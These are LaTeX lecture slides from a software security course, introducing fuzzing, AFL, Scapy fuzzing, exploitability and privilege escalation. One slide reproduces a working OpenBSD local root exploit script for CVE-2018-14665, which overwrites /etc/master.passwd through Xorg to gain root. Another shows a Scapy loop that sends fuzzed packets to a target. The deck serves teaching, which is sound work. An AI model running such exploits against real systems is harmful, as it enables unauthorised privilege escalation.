\documentclass[Screen16to9,17pt]{foils}
\usepackage{zencurity-slides}
\externaldocument{software-security-exercises}
\selectlanguage{english}


\begin{document}

\mytitlepage
{11. Fuzzing Intro}
{KEA Kompetence VF1 Software Security}

\slide{Plan for today}

\begin{list1}
\item Subjects
\begin{list2}
\item What is Fuzzing
\item Example fuzzers
\item Web fuzzing
\item Determining Exploitability
\end{list2}
\item Exercises
\begin{list2}
\item Try American fuzzy lop http://lcamtuf.coredump.cx/afl/
\end{list2}
\end{list1}

\slide{Reading Summary}

\begin{list1}
\item AoST chapter 10: Implementing a custom Fuzz Utility
\item AoST chapter 11: Local Fault Injection
\item AoST chapter 12: Determining Exploitability
\end{list1}

Note: the tool Ethereal was later renamed to Wireshark.

\slide{Goals: Fuzzing}

\hlkimage{18cm}{fuzzer.pdf}

\begin{list1}
\item /dev/random is a file on Unix that gives random data
\item Sending random data to programs is called fuzzing and can reveal security problems
\item Lots of crashes is often the result, and when investigated may be exploitable
\item Recommended to use fuzzers that can use some structure and knowledge and then randomize individual fields in protocols, file types etc.
\end{list1}

\slide{What is Fuzzing}

\begin{quote}
  Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. Typically, fuzzers are used to test programs that take structured inputs. This structure is specified, e.g., in a file format or protocol and distinguishes valid from invalid input. An effective fuzzer generates semi-valid inputs that are "valid enough" in that they are not directly rejected by the parser, but do create unexpected behaviors deeper in the program and are "invalid enough" to expose corner cases that have not been properly dealt with.
\end{quote}
Source: \url{https://en.wikipedia.org/wiki/Fuzzing}

See also the original Fuzz report: \emph{An Empirical Study of the Reliability
of UNIX Utilities}, Barton P. Miller 1990\\
and updates \emph{Fuzz Revisited: A Re-examination of the Reliability
of UNIX Utilities and Services}\\
\url{http://pages.cs.wisc.edu/~bart/fuzz/}

\slide{Fuzz Revisited}

Fuzz Revisited: A Re-examination of the Reliability
of
UNIX Utilities and Services

\begin{quote}
We have tested the reliability of a large collection of basic UNIX utility programs, X-Window
applications and servers, and networkservices. We used a simple testing method of subjecting these
programs to a random inputstream.\\
...\\
The result of our testing is that we can crash (with coredump) or hang (infiniteloop) over 40\% (in the
worst case) of the basic programs and over 25\% of the X-Window applications.\\
...\\
We also tested how utility programs checked their return codes from the memory allocation library
routines by simulating the unavailability of virtual memory. We could crash almost half of the programs
that we tested in this way.
\end{quote}

\centerline{october 1995}



\slide{Example fuzzers}

Types of fuzzers
A fuzzer can be categorized as follows:[9][1]
\begin{list2}
\item A fuzzer can be generation-based or mutation-based depending on whether inputs are generated from scratch or by modifying existing inputs,
\item A fuzzer can be dumb or smart depending on whether it is aware of input structure, and
\item A fuzzer can be white-, grey-, or black-box, depending on whether it is aware of program structure.
\end{list2}


\slide{Simple fuzzer}

\begin{alltt}
$ for i in 10 20 30 40 50
>> do
>> ./demo `perl -e "print 'A'x$i"`
>> done
AAAAAAAAAA
AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Memory fault
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Memory fault
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Memory fault
\end{alltt}

\centerline{Memory fault/segmentation fault - juicy!}



\slide{Custom Fuzzers}

\hlkimage{4cm}{anp_cover-front-final.png}
The book describes in AoST chapter 10: Implementing a custom Fuzz Utility

A very similar method can be found with more detail in the book,\\
\emph{Attacking Network Protocols A Hacker's Guide to Capture, Analysis, and Exploitation}\\
by James Forshaw December 2017, 336 pp. ISBN-13: 9781593277505

\url{https://nostarch.com/networkprotocols}

\slide{Use Developer Libraries}

Note how the custom fuzzer described in the book used the SOAPpy library and thus created a fuzzer in very few lines of code.

Especially for common and binary protocols re-using existing code helps.

This goes for:
\begin{list2}
\item DNS - Domain Name System, a binary protocol
\item HTTP with encryption, compression, WSDL, REST, XML-RPC etc.
\item Open source libraries with different file types
\end{list2}


\slide{Fuzzing local processes}

The book describes in AoST chapter 11: Local Fault Injection, how to send data to local processes through:

\begin{list2}
\item command line, environment variables, interprocess communication, shared memory, config files, input files, registry keys and system settings
\item Also the book notes, the kernels running may be vulnerable
\item Both Windows and Unix have similar features, that can be abused
\item Goal is usually command execution, and privilege escalation
\item When you have a foothold and can execute commands, you can often find local exploits for kernel or drivers
\end{list2}

\slide{Attacking Local Applications}

\begin{list2}
\item Enumerate local resources used by the application
\item Determine access permissions of shared or persistent resources
\item Identify the exposed local attack surface area
\item Best case examine the application source code
\item Also monitor application behaviors during execution
\end{list2}


\slide{CVE-2018-14665 Multiple Local Privilege Escalation}

\begin{alltt}\footnotesize
#!/bin/sh
# local privilege escalation in X11 currently
# unpatched in OpenBSD 6.4 stable - exploit
# uses cve-2018-14665 to overwrite files as root.
# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
# and vulnerable in default OpenBSD.
# - https://hacker.house
echo [+] OpenBSD 6.4-stable local root exploit
cd /etc
Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh'
 -logfile master.passwd :1 &
sleep 5
pkill Xorg
echo [-] dont forget to mv and chmod /etc/master.passwd.old back
echo [+] type 'Password1' and hit enter for root
su -
\end{alltt}
Code from: \url{https://weeraman.com/x-org-security-vulnerability-cve-2018-14665-f97f9ebe91b3}

\begin{list2}
\item The X.Org project provides an open source implementation of the X Window System. X.Org security advisory: October 25, 2018
\url{https://lists.x.org/archives/xorg-announce/2018-October/002927.html}

%\item Example exploit method, write cron job - wait for shell:\\
%\url{https://www.exploit-db.com/exploits/45742}
\end{list2}



\slide{Fuzzing File Formats}



\begin{list2}
\item Lots of applications open files, and some are not designed for safety and security
\item File formats are also complex and difficult to parse
\item Files served over HTTP is no exception
\item Browsers have been susceptible to various attacks from the start
\item We have seen problems with ActiveX components, as described in book
\item Also Java has had a lot of problems over the years - JRE 617 vulnerabilities 2010 - 2019\\
\url{https://www.cvedetails.com/product/19117/Oracle-JRE.html?vendor_id=93}
\item Adobe Flash player - 1075 vulnerabilities 2005 - 2019\\
\url{https://www.cvedetails.com/product/6761/Adobe-Flash-Player.html?vendor_id=53}
\item Adobe Acrobat Reader PDF - 681 vulnerabilities from 1999 to 2018!\\ \url{https://www.cvedetails.com/product/497/Adobe-Acrobat-Reader.html?vendor_id=53}
\end{list2}

\slide{Pwn2Own - attacking browsers}

\begin{quote}
Contest 2015–2018
In 2015,[61] every single prize available was claimed.

In 2016, Chrome, Microsoft Edge and Safari were all hacked.[62] According to Brian Gorenc, manager of Vulnerability Research at HPE, they had chosen not to include Firefox that year as they had "wanted to focus on the browsers that [had] made serious security improvements in the last year".[63]

In 2017, Chrome did not have any successful hacks (although only one team attempted to target Chrome), the subsequent browsers that best fared were, in order, Firefox, Safari and Edge.[64]

In 2018, the conference was much smaller and sponsored primarily by Microsoft. Shortly before the conference, Microsoft had patched several vulnerabilities in Edge, causing many teams to withdraw. Nevertheless, certain openings were found in Edge, Safari, Firefox and more.[65] No hack attempts were made against Chrome,[66][67] although the reward offered was the same as for Edge.[68] While many Microsoft products had large rewards available to anyone who was able to gain access through them, only Edge was successfully exploited.
\end{quote}

Pwn2Own
\url{https://en.wikipedia.org/wiki/Pwn2Own}


\slide{Example Linux Kernel Vulnerabilities}

The Linux kernel has had some vulnerabilities over the years:\\
This link is for: Linux » Linux Kernel : Security Vulnerabilities (CVSS score >= 9)\\

{\footnotesize\url{https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/cvssscoremin-9/cvssscoremax-/Linux-Linux-Kernel.html}}

Linux Kernel 2308 vulnerabilities from 1999 to 2019\\
\url{https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33}

\slide{Linux Kernel Fuzzing}

\begin{list2}
\item CVE-2016-0758 Integer overflow in lib/asn1\_decoder.c in the Linux kernel before 4.6 allows local users to gain privileges via crafted ASN.1 data.\\
\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0758}
\item Linux kernel have about 5 ASN.1 parsers\\
\url{https://www.x41-dsec.de/de/lab/blog/kernel_userspace/}
\end{list2}

We will go through this article




\slide{Example fuzzers}

\begin{quote}
american fuzzy lop is a free software fuzzer that employs genetic algorithms in order to efficiently increase code coverage of the test cases. So far it helped in detection of significant software bugs in dozens of major free software projects, including X.Org Server,[2] PHP,[3] OpenSSL,[4][5] pngcrush, bash,[6] Firefox,[7] BIND,[8][9] Qt,[10] and SQLite.[11]

american fuzzy lop's source code is published on GitHub. Its name is a reference to a breed of rabbit, the American Fuzzy Lop.
\end{quote}

\begin{list2}
\item Several books and web sites are dedicated to fuzzing, one such:\\ \url{http://www.fuzzing.org/}
\item \url{https://en.wikipedia.org/wiki/American_fuzzy_lop_(fuzzer)}
\item Another one is Sulley, A pure-python fully automated and unattended fuzzing framework.\\
\url{https://github.com/OpenRCE/sulley}
\item Scapy Packet crafting for Python2 and Python3
\url{https://scapy.net/}
\end{list2}


\slide{Scapy Fuzzing}

\begin{quote}{\bf
Fuzzing}

The function fuzz() is able to change any default value that is not to be calculated (like checksums) by an object whose value is random and whose type is adapted to the field. This enables quickly building fuzzing templates and sending them in a loop. In the following example, the IP layer is normal, and the UDP and NTP layers are fuzzed. The UDP checksum will be correct, the UDP destination port will be overloaded by NTP to be 123 and the NTP version will be forced to be 4. All the other ports will be randomized. Note: If you use fuzz() in IP layer, src and dst parameter won’t be random so in order to do that use RandIP().:
\end{quote}

\begin{minted}[fontsize=\small]{python}
>>> send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)
................^C
Sent 16 packets.
\end{minted}

\exercise{ex:scapy}

\exercise{ex:american-fuzzy-lop}

\slide{Determining Exploitability}

\begin{list2}
\item AoST chapter 12: Determining Exploitability
\item We have found input that crashes an application, is it exploitable?
\item Is the application privileged, is the function part of a library used in a privileged application?
\item Time, Reliability/Reproduccibility, command execution, network access, knowledge
\item Not all vulnerabilities are remote root arbitrary command execution, often a string of vulnerabilities are put together
\item Architecture, dynamic environment, hardware
\end{list2}

\slide{Weak Structural Security}

Our book describes more design flaws:
\begin{list2}
\item Large Attack surface
\item Running a Process at Too High a Privilege Level, dont run everything as root or administrator
\item No Defense in Depth, use more controls, make a strong chain
\item Not Failing Securely
\item Mixing Code and Data
\item Misplaced trust in External Systems
\item Insecure Defaults
\item Missing Audit Logs
\end{list2}

Repeated here from initial overview - large surface increases risk!


\slide{Privilegier privilege escalation}
\begin{list1}
\item {\bfseries Privilege escalation} er når man på en eller anden vis
opnår højere privileger på et system, eksempelvis som
følge af fejl i programmer der afvikles med højere
privilegier. Derfor HTTPD servere på Unix afvikles som
nobody -- ingen specielle rettigheder.
\item En angriber der kan afvikle vilkårlige kommandoer kan ofte finde
  en sårbarhed som kan udnyttes lokalt -- få rettigheder = lille skade
\end{list1}

Eksempel: man finder exploit som giver kommandolinieadgang til et system
som almindelig bruger

Ved at bruge en local exploit, Linuxkernen kan man måske forårsage fejl
og opnå root, GNU Screen med SUID bit eksempelvis



\slide{MITRE ATT\&CK Framework Privilege Escalation}

\begin{quote}
Privilege Escalation
The adversary is trying to gain higher-level permissions.

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.
\end{quote}

And describes approx 30 techniques for doing this, of which  some can be found using fuzzing

Source:
\url{https://attack.mitre.org/tactics/TA0004/}


\slide{Local vs. remote exploits}

\begin{list1}
\item {\bfseries Local vs. remote}
angiver om et exploit er rettet mod
en sårbarhed lokalt på maskinen, eksempelvis
opnå højere privilegier, eller beregnet
til at udnytter sårbarheder over netværk
\item {\bfseries Remote root exploit}
- den type man frygter mest, idet
det er et exploit program der når det afvikles giver
angriberen fuld kontrol, root user er administrator
på Unix, over netværket.
\item {\bfseries Zero-day exploits} dem som ikke offentliggøres -- dem
  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
  til dem før de offentliggøres og ofte er der umiddelbart ingen
  rettelser til de sårbarheder
\end{list1}



\slide{Zero day 0-day vulnerabilities}

\begin{quote}

  Project Zero's team mission is to "make zero-day hard", i.e. to make it more costly to discover and exploit security vulnerabilities. We primarily achieve this by performing our own security research, but at times we also study external instances of zero-day exploits that were discovered "in the wild". These cases provide an interesting glimpse into real-world attacker behavior and capabilities, in a way that nicely augments the insights we gain from our own research.

  Today, we're sharing our tracking spreadsheet for publicly known cases of detected zero-day exploits, in the hope that this can be a useful community resource:

  Spreadsheet link: 0day "In the Wild"\\
  \link{https://googleprojectzero.blogspot.com/p/0day.html}
\end{quote}

\begin{list2}
\item Not all vulnerabilities are found and reported to the vendors
\item Some vulnerabilities are exploited \emph{in the wild}
\end{list2}

\slide{Book Summary}

Last chapter:
\begin{list2}
\item Last chapter describes how to analyse crash dumps, for exploitability
\item Can attacker use the vulnerability found for anything? control instruction pointer?
\item Book finishes with Mitigating factors: use everything!
\item CPU with hardware support, operating system with everything turned on Address space layout randomization (ASLR), stack protection, heap protection, etc.\\
\url{https://en.wikipedia.org/wiki/Address_space_layout_randomization}
\item Most laptop and server operating systems do this already in never versions\smiley
\item Internet of Things do almost none of these
\end{list2}

Book overall?

Good or bad?


\slidenext{}


\end{document}
